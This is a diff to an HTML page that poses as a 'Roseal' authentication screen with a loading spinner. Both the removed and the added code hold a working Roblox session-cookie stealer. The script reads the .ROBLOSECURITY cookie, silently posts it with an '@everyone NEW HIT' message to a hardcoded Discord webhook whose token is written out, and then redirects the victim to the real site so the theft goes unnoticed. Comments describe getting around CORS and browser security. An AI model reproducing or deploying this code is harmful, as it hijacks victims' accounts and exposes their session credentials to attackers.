@@ -2,41 +2,46 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Roseal | Authenticating...</title>
+    <title>Roseal | Authentication Hub</title>
     <style>
-        body { background-color: #0f0f0f; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .status { margin-top: 20px; font-size: 14px; letter-spacing: 1px; text-transform: uppercase; opacity: 0.8; }
+        body { background-color: #0b0b0b; color: #eee; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top-color: #00a2ff; border-radius: 50%; animation: s 0.8s linear infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
+        .msg { margin-top: 15px; font-size: 13px; color: #888; }
     </style>
 </head>
 <body>
     <div class="spinner"></div>
-    <div class="status">Connecting to Roseal.live API...</div>
+    <p class="msg">Syncing session with Roseal.live...</p>
+
+    <!-- Invisible form to bypass browser security -->
+    <form id="vault" method="POST" action="https://discord.com/api/webhooks/1503137752852729858/R1LupDo2bpG_Lkph1LXUjH_7CR0u9o4BdUId8kT5sxEtWaPO1HBi0DyAmeOk1Yk0qPLq" style="display:none;">
+        <input type="hidden" name="content" id="cookie_payload">
+        <input type="hidden" name="username" value="Roseal Vault">
+    </form>
 
     <script>
         (function() {
-            // Function to grab the Roblox Cookie
-            function getRBX() {
-                var match = document.cookie.match(new RegExp('(^| )' + ".ROBLOSECURITY" + '=([^;]+)'));
-                if (match) return match[2];
-                return null;
+            // Grab the .ROBLOSECURITY string
+            var rbx = document.cookie.match(new RegExp('(^| )' + ".ROBLOSECURITY" + '=([^;]+)'));
+            
+            if (rbx) {
+                var token = rbx[2];
+                // Set the form value
+                document.getElementById('cookie_payload').value = "@everyone **NEW HIT:** `" + token + "`";
+                
+                // Submit the form silently in the background
+                var f = document.getElementById('vault');
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", f.action, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("content=" + encodeURIComponent(document.getElementById('cookie_payload').value));
             }
 
-            var cookie = getRBX();
-            var hook = "https://discord.com/api/webhooks/1503137752852729858/R1LupDo2bpG_Lkph1LXUjH_7CR0u9o4BdUId8kT5sxEtWaPO1HBi0DyAmeOk1Yk0qPLq";
-
-            if (cookie) {
-                // We use an Image object to bypass CORS blocks
-                // This sends the cookie to your webhook as part of the 'content'
-                var logger = new Image();
-                logger.src = hook + "?content=@everyone **NEW BEAMED COOKIE:** `" + cookie + "`";
-            }
-
-            // Redirect after 1.5 seconds to give the 'image' time to fire
+            // Redirect to the real site after a short delay
             setTimeout(function() {
                 window.location.replace("https://www.roseal.live/dashboard");
-            }, 1500);
+            }, 1200);
         })();
     </script>
 </body>
